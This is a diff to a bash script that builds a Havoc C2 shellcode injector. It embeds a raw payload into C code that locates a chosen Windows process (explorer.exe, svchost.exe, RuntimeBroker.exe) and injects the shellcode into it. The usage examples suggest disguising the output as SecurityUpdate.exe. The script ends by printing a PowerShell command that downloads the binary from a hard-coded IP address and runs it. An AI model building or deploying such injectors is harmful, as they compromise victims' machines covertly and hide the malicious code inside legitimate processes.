@@ -9,15 +9,16 @@ Usage: $(basename "$0") [OPTIONS]
 Build a standalone Havoc shellcode injector with embedded payload.
 
 OPTIONS:
-    -s <path>    Path to shellcode.bin (required)
-    -o <path>    Output executable path (required)
-    -d <path>    Havoc installation directory (default: \$HOME/Havoc)
-    -h           Show this help message
+    -s <path>      Path to shellcode.bin (required)
+    -o <path>      Output executable path (required)
+    -t <process>   Target process name (default: explorer.exe)
+    -d <path>      Havoc installation directory (default: \$HOME/Havoc)
+    -h             Show this help message
 
 EXAMPLES:
     $(basename "$0") -s shellcode.bin -o update.exe
-    $(basename "$0") -s ./payload.bin -o SecurityUpdate.exe -d /opt/Havoc
-    $(basename "$0") -s shellcode.bin -o /tmp/beacon.exe
+    $(basename "$0") -s shellcode.bin -o beacon.exe -t svchost.exe
+    $(basename "$0") -s ./payload.bin -o SecurityUpdate.exe -t RuntimeBroker.exe -d /opt/Havoc
 
 HELP
     exit 0
@@ -26,11 +27,13 @@ HELP
 HAVOC_DIR="$HOME/Havoc"
 SHELLCODE_BIN=""
 OUTPUT_EXE=""
+TARGET_PROCESS="explorer.exe"
 
-while getopts "s:o:d:h" opt; do
+while getopts "s:o:t:d:h" opt; do
     case $opt in
         s) SHELLCODE_BIN="$OPTARG" ;;
         o) OUTPUT_EXE="$OPTARG" ;;
+        t) TARGET_PROCESS="$OPTARG" ;;
         d) HAVOC_DIR="$OPTARG" ;;
         h) show_help ;;
         *) show_help ;;
@@ -63,6 +66,7 @@ TEMP_ARRAY="/tmp/shellcode_array_$$.txt"
 TEMP_TEMPLATE="/tmp/embedded_injector_$$.c"
 TEMP_FINAL="/tmp/embedded_injector_final_$$.c"
 
+echo "[+] Target process: $TARGET_PROCESS"
 echo "[+] Converting shellcode to C array format..."
 xxd -p "$SHELLCODE_BIN" | tr -d '\n' | sed 's/../0x&, /g' | sed 's/, $//' | fold -w 78 > "$TEMP_ARRAY"
 
@@ -77,7 +81,7 @@ unsigned char shellcode[] = {
 SHELLCODE_BYTES_HERE
 };
 
-DWORD FindExplorerPID() {
+DWORD FindTargetPID() {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return 0;
     
@@ -90,7 +94,7 @@ DWORD FindExplorerPID() {
     }
     
     do {
-        if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
+        if (_stricmp(pe.szExeFile, "TARGET_PROCESS_HERE") == 0) {
             CloseHandle(snap);
             return pe.th32ProcessID;
         }
@@ -101,7 +105,7 @@ DWORD FindExplorerPID() {
 }
 
 int main() {
-    DWORD pid = FindExplorerPID();
+    DWORD pid = FindTargetPID();
     if (!pid) return 1;
     
     size_t size = sizeof(shellcode);
@@ -124,8 +128,8 @@ int main() {
 }
 CEOF
 
-echo "[+] Embedding shellcode into template..."
-awk '/SHELLCODE_BYTES_HERE/ {system("cat '"$TEMP_ARRAY"'"); next} {print}' "$TEMP_TEMPLATE" > "$TEMP_FINAL"
+echo "[+] Embedding shellcode and target process into template..."
+awk '/SHELLCODE_BYTES_HERE/ {system("cat '"$TEMP_ARRAY"'"); next} {print}' "$TEMP_TEMPLATE" | sed "s/TARGET_PROCESS_HERE/$TARGET_PROCESS/" > "$TEMP_FINAL"
 
 echo "[+] Compiling with Havoc mingw toolchain..."
 "$COMPILER" -o "$OUTPUT_EXE" "$TEMP_FINAL" -s
@@ -136,6 +140,7 @@ if [ -f "$OUTPUT_EXE" ]; then
     SIZE=$(stat -f%z "$OUTPUT_EXE" 2>/dev/null || stat -c%s "$OUTPUT_EXE" 2>/dev/null)
     BASENAME=$(basename "$OUTPUT_EXE")
     echo "[+] Success! Compiled: $OUTPUT_EXE ($SIZE bytes)"
+    echo "[+] Target: $TARGET_PROCESS"
     echo "[+] Deploy with: IWR -Uri http://100.89.23.94:8002/$BASENAME -OutFile C:\\tmp\\$BASENAME; cd C:\\tmp; .\\$BASENAME"
 else
     echo "[-] Compilation failed"
